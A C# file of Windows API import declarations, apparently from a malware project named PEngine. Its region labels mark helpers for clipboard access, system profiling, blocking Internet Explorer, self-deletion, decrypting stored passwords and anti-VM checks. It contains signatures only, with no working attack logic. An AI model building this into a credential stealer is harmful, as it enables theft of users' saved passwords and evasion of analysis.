namespace PEngine.Helpers
{
    using System;
    using System.Runtime.InteropServices;

    internal static class NativeMethods
    {
        #region For ClipBoard

        [DllImport("user32.dll")]
        public static extern IntPtr GetClipboardData(uint uFormat);

        [DllImport("user32.dll")]
        public static extern bool IsClipboardFormatAvailable(uint format);

        [DllImport("user32.dll", SetLastError = true)]
        internal static extern bool OpenClipboard(IntPtr hWndNewOwner);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool CloseClipboard();

        [DllImport("user32.dll")]
        public static extern bool EmptyClipboard();

        [DllImport("kernel32.dll")]
        internal static extern IntPtr GlobalLock(IntPtr hMem);

        [DllImport("kernel32.dll")]
        internal static extern bool GlobalUnlock(IntPtr hMem);

        #endregion

        #region For PCInfo

        [DllImport("Kernel32.dll")]
        public static extern bool GetProductInfo(int osMajorVersion, int osMinorVersion, int spMajorVersion, int spMinorVersion, out int edition);

        [DllImport("kernel32.dll")]
        public static extern void GetSystemInfo([MarshalAs(UnmanagedType.Struct)] ref Structures.SYSTEM_INFO lpSystemInfo);

        [DllImport("kernel32.dll")]
        public static extern bool GetVersionEx(ref Structures.OSVERSIONINFOEX osVersionInfo);

        [DllImport("user32")]
        public static extern int GetSystemMetrics(int nIndex);

        #endregion

        #region For BlockIE

        [DllImport("wininet.dll")]
        public static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);

        #endregion

        #region For Loader

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteFileW([MarshalAs(UnmanagedType.LPWStr)]string lpFileName);

        #endregion

        #region For Decrypt Password

        [DllImport("Crypt32.dll", CharSet = CharSet.Unicode)]
        public static extern unsafe bool CryptUnprotectData(Structures.DATA_BLOB* pDataIn, string szDataDescr, Structures.DATA_BLOB* pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, uint dwFlags, Structures.DATA_BLOB* pDataOut);

        #endregion

        #region For AntiVM

        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode)]
        internal static extern IntPtr GetModuleHandle(string lpModuleName);

        #endregion

    }
}